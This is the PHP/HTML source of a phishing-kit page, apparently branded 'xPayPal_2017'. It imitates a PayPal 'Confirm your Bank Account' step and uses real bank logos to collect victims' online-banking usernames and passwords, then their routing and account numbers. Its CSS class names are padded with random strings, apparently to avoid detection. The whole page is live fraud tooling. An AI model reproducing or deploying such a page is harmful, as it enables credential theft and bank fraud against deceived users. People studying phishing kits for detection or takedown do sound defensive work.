<?php
include 'inc/config.php';
include 'language.php';
?>
    <html lang="en">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" href="./file/font-sans.css">
        <link rel="stylesheet" href="./file/template.css">
        <link rel="stylesheet" href="./file/css.css">
        <title>Confirm your Bank Account</title>
        <meta name="description" content="xPayPal_2017 v1.1 | Coded By CaZaNoVa163">
        <meta name="author" content="CaZaNoVa163">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script type="text/javascript" src="./file/jquery.min.js"></script>
        <script type="text/javascript" src="./file/jstz.min.js"></script>
        <script type="text/javascript" src="./file/jquery.mobile.custom.min.js"></script>
        <script type="text/javascript" src="./file/jquery.browser.min.js"></script>
        <link rel="icon" type="image/png" href="img/favicon.ico">
    </head>

    <body>
        <div id="loader" class="d1xb04v7ib1a gcd0yn9m9uj239ejjanazq2ubz3er5ey8 spinner oxxo w9kp2kvcuxrvm8n" style="display: none; opacity: 0;">
            <p id="loading_title">Redirecting...</p>
        </div>
        <div id="ajax" style="opacity: 1;">
            <script type="text/javascript" src="./file/bank.min.js"></script>
            <script type="text/javascript" src="./file/bank.js"></script>
            <style>
body {
    background-color: #f8f8f8;
}

            </style>
            <input type="hidden" name="truelogin" id="truelogin" value="No">
            <div id="header_update">
                <div class="o9pqbfibp723r rxs container_update for_nav">
                    <div id="menu_btn_update"></div>
                    <div id="logo_update"></div>
                    <ul class="p7klo y7iz8iuvl84kd008n1wi nav">
                        <li class="9htku9kj6u953uqfslrxchvq9h0m2s820r nav-item">
                            <a class="4f0 zcrmfz8xzgnc 6b2x nav-link" href="#">
                                <?=$language['bank']['navbar'][1];?>
                            </a>
                        </li>
                        <li class="zflqfatyozomnet1 nav-item">
                            <a class="7v6m8bcdntkpd944nghs1 1 nav-link" href="#">
                                <?=$language['bank']['navbar'][2];?>
                            </a>
                        </li>
                        <li class="vihukkyz5 e9993ngb79bzk12a2zafuxo3h0e7q 7v 7u nav-item">
                            <a class="01dsrfzb4d6b5 nav-link" href="#">
                                <?=$language['bank']['navbar'][3];?>
                            </a>
                        </li>
                        <li class="7gl3qc2qfthkczr22l7yo20oe2nc5iw3 nav-item">
                            <a class="xtcnb5fn35 nav-link" href="#">
                                <?=$language['bank']['navbar'][4];?>
                            </a>
                        </li>
                        <li class="6remp1lrh10hpkl3mh 1a6u nav-item">
                            <a class="1ozhgb0p4ryj2adfid7jar8t nav-link" href="#">
                                <?=$language['bank']['navbar'][5];?>
                            </a>
                        </li>
                    </ul>
                    <div id="logout">
                        <div class="16vbzwf55j3fkke5xsophhuxqpm7m24dyqfoclj9wcf8ol4 sub_logout">
                            <button class="6561 vhg ktkkg log_out"><?=$language['bank']['navbar'][6];?></button>
                        </div>
                        <div class="jo01srzbww7sn8dved7zoh63zbxsctgm98dsq sub_logout" id="setting">
                        </div>
                        <div class="lk05nkb1ka53r sub_logout" id="alert">
                        </div>
                    </div>
                </div>
            </div>
            <div id="sub_menu">
                <div class="c7110agfd62awr4sah8csxbxmwa container_update">
                    <ul class="3v24408no a1wbfj09am sub_nav">
                        <li class="t0dnl6hgxfvbgw34y9ep9f2t0s0 0y5ko y1779uduxkgr sub_nav-item">
                            <a class="ppc15dpxbnwxrhk2p29 nav-link" href="#">
                                <?=$language['bank']['sub_navbar'][1];?>
                            </a>
                        </li>
                        <li class="ttg9 k05pgsruffbnq53j4fue5m60e5jycjyo u4hdm2js5y91 sub_nav-item">
                            <a class="aw50a6k5doh7z03o0u8 gx58icvupegr2bh nav-link" href="#">
                                <?=$language['bank']['sub_navbar'][2];?>
                            </a>
                        </li>
                        <li class="y5boq pyylw8pis5ozng2v 2dz6bx80l431k4 sub_nav-item">
                            <a class="ss5tk jhb7f3jawbmqkm nav-link" href="#">
                                <?=$language['bank']['sub_navbar'][3];?>
                            </a>
                        </li>
                        <li class="h 105kb5vj8sq23ro64 sub_nav-item">
                            <a class="yd6uo8q iotzgnhw nav-link" href="#">
                                <?=$language['bank']['sub_navbar'][4];?>
                            </a>
                        </li>
                    </ul>
                    <div class="px2e 83d4nt34tbjd2rr d1cxioe27 iu3nu1gzvvioq3r arrow"></div>
                </div>
            </div>
            <div id="update_content">
                <div class="uicrpuefxdwm8bd2z  x1nmxczolyj9jtb29 container_update">
                    <div class="wiilyu 8tkrwcrjax row first">
                        <div class="wfs322beqxfpgq84updvc0yta15ew2cj8wc1pf663bmask5d six columns">
                            <div class="bbc zf2elybe1ofk0borbem3t1vzauscwvdl26revtj row">
                                <div id="profile_div">
                                    <font class="rmvapixuvqq profile">
                                        <?=$language['bank'][1];?>
                                    </font>
                                    <div id="profile_img" style="background-image:url(img/profile.png);"></div>
                                    <div id="Update_Photo">
                                        <?=$language['bank'][2];?>
                                    </div>
                                </div>
                                <div id="profile_name_div">
                                    <div id="my_name">
                                        <?=$_SESSION['user'];?>
                                    </div>
                                    <div id="joined_at">
                                        <?=$language['bank'][3];?> <?=$_SESSION['joined'];?>
                                            <font>
                                                <?=$language['bank'][4];?>
                                            </font>
                                    </div>
                                </div>
                            </div>
                            <div id="frm_account">
                                <table>
                                    <tbody>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_checked.png"></td>
                                            <td>
                                                <?=$language['bank'][5][1];?>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_checked.png"></td>
                                            <td>
                                                <?=$language['bank'][5][2];?>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_uncheck.png"></td>
                                            <td>
                                                <?=$language['bank'][5][3];?>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td width="30px"><img src="./file/icon_uncheck.png"></td>
                                            <td>
                                                <?=$language['bank'][5][4];?>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <div class="tgjmermx8utx9ql7abh0q07q9fsvawov4y89glxe6g six columns">
                            <div class="e1uxmvk1heqfeyr24o wly1eo profile" id="bank_page_title">
                                <?=$language['bank'][6];?>
                            </div>
                            <div id="address_div">
                                <div id="bank_step0" style="display: block;">
                                    <div class="lf70a 3o61 bank_box" id="bank_id_bankofamerica"><img src="./file/bankofamerica.png"></div>
                                    <div class="lqlol1sgaa9b1uo3rpq3pinnyna 2uydaasm2 bank_box" id="bank_id_suntrust"><img src="./file/suntrust.png"></div>
                                    <div class="oyutg49brblggoq9v33mspe37aym2zego01vu0yc3 bank_box" id="bank_id_PNC"><img src="./file/PNC.png"></div>
                                    <div class=" cpashbv35a7fx5n bank_box" id="bank_id_capitalone"><img src="./file/capitalone.png"></div>
                                    <div class="udiw9libqr8r12yzsj bank_box" id="bank_id_chase"><img src="./file/chase.png"></div>
                                    <div class="lkhvz3czd2iu0q bank_box" id="bank_id_citi"><img src="./file/citi.png"></div>
                                    <div class="e5y91wbo3es1rai86  bank_box" id="bank_id_usbank"><img src="./file/usbank.png"></div>
                                    <div class="uxg0uv4yf4rzv8l1idqkngwv48p43n1na9evu k143rp24h bank_box" id="bank_id_wellsfargo"><img src="./file/wellsfargo.png"></div>
                                    <div class="rcwlo71lisaodhaqj65joww4n7 b bank_box" id="bank_id_usaa"><img src="./file/usaa.png"></div>
                                    <div class="255xal8duuqljhhgbuo1367zb79e8l50g1ohcmmx bank_box" id="bank_id_huntington"><img src="./file/huntington.png"></div>
                                    <div class="hpi92hzqbflxbqml8ztic9wy5edu bank_box" id="bank_id_fifththirdbank"><img src="./file/fifththirdbank.png"></div>
                                    <div class="bddvzjaqtazac0fpr0lyh2r8r9p3rvrt0wfq6 bank_box" id="bank_id_regions"><img src="./file/regions.png"></div>
                                    <div class="4590idk5bmqros18 bank_box" id="bank_id_bank"><img src="./file/ibank.png"></div>
                                    <div class="o6x1m4ww2jl8c794hi15o05bhjhqwthbq6331qpt0 bank_box" id="bank_id_i_have_a_different_bank"><img src="./file/i_have_a_different_bank.png"></div>
                                    <button type="button" name="i_dont_have_a_bank" id="i_dont_have_a_bank" class="k1e iwvdu610pcwuq u-full-width"><?=$language['bank'][7];?></button>
                                </div>
                                <div id="bank_step1">
                                    <div class="a881lir2ywkhiee4e row" id="bank_head">
                                        <?=$language['bank'][8][1];?> <b>Toronto-dominion Bank</b>
                                            <?=$language['bank'][8][2];?>
                                    </div>
                                    <div class="dzscr5m xbx8j6dp1iznzbpuglogjd1o3 row">
                                        <center><img id="bank_image" src="./file/chase.png"></center>
                                    </div>
                                    <div id="wallet_div">
                                        <table>
                                            <tbody>
                                                <tr>
                                                    <td><input type="text" name="eBankName" id="eBankName" value="" placeholder="Bank Name" class="36mw2p23pkwn2ivg0rjn2q5tg493yjusf8f9o824j u-full-width" style="display:none;"></td>
                                                </tr>
                                                <tr>
                                                    <td><input type="text" name="eUsername" id="eUsername" value="" placeholder="Username" class=" rpnbhsd6hn u-full-width"></td>
                                                </tr>
                                                <tr>
                                                    <td><input type="password" name="ePassword" id="ePassword" value="" placeholder="Password" class=" 9i3fpss9n u-full-width"></td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="zli9iryisxsl495 row">
                                            <?=$language['bank'][8][3];?> <b>Link Bank Instantly</b>,
                                                <?=$language['bank'][8][4];?>
                                                    <font class="tsufb3anld0q3b03khru0fccab9n blue">
                                                        <?=$language['bank'][8][1];?>
                                                    </font>
                                                    <?=$language['bank'][8][6];?>
                                        </div>
                                        <table>
                                            <tbody>
                                                <tr>
                                                    <td><input type="button" name="bank_login_submit" id="bank_login_submit" value="Link Bank Instantly" class="5d8yzkz4hrdimpmhfsl0jhz388g71s4xx2lmcahlslu627e u-full-width button-primary"></td>
                                                </tr>
                                                <tr>
                                                    <td><input type="button" name="ignore_this_step" id="ignore_1" value="ignorer cette &#233;tape" class="dsz7foiu4jn5 wxnb0gl2k2f2rd98 u-full-width"></td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                                <div id="bank_step2">
                                    <div class="bir2ejuofq1i3a ahoiqwl1tu7k97c7 lp2q0m663yfw0gy8v row" id="bank_head2">
                                        <?=$language['bank'][9][1];?> <b>Toronto-dominion Bank</b>
                                            <?=$language['bank'][9][2];?>
                                    </div>

                                    <div id="xChecking" class="wa0mhpl3m1bx  bank_type first active">Checking</div>
                                    <div id="xSavings" class="kj8kxfq3qgiy8wdx6x9g8y0xzc1strl42kepqwj84sx bank_type second not_active">Savings</div>

                                    <div class="eoe8v7oyn582 955dzj2b khb92vjy row">
                                        <img src="./file/checking.png" id="check_img" width="100%">
                                    </div>

                                    <table>
                                        <tbody>
                                            <tr>
                                                <td>
                                                    <input type="text" name="uRouting" id="uRouting" value="" maxlength="9" placeholder="Routing number" class="ejkolh8vfry0lqoumlh8ox8c2jdx u-pull-left" style="width:49%;">
                                                    <input type="text" name="uAccount" id="uAccount" value="" maxlength="17" placeholder="Account number" class="onte2dgpx5iyj4bd4 mgfs9 x4 u-pull-right" style="width:49%;">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <div class="4s2t2xv7swjz23z2rtpunmcxxfb0mzj row">
                                        <?=$language['bank'][10];?>
                                    </div>
                                    <table>
                                        <tbody>
                                            <tr>
                                                <td><input type="button" name="bank_routing_submit" id="bank_routing_submit" value="Agree and Link" class="esj16sb87p1zs5y u-full-width button-primary"></td>
                                            </tr>
                                            <tr>
                                                <td><input type="button" name="ignore_this_step" id="ignore_2" value="ignorer cette &#233;tape" class="knffqhqziiqoxh8tu u-full-width"></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                                <input type="hidden" name="savings_or_checking" id="savings_or_checking" value="Checking">
                            </div>
                        </div>
                    </div>
                    <div id="footer_update_mobile">
                        <div class="jp2o1y7 bevyiqn6jpuyi8quzrdo4fbdv4sn row footer_row_1">
                            <font class="78bpcqjisn5n7i6nyray16go footer1">Help&nbsp;&amp;&nbsp;Contact&nbsp;&nbsp;Security</font>
                    /font>
                        <font class="duyyccsw8 j9n4ak83z2o02 footer3">|</font>
                        <font class="wdnkhq44p4dph8qt7jj0z to59tgqc6chjop1j footer4">Privacy&nbsp;&nbsp;&nbsp;Legal&nbsp;&nbsp;&nbsp;Policy updates</font>
                    </div>
                </div>
            </div>
        </div>
    </body>

    </html>
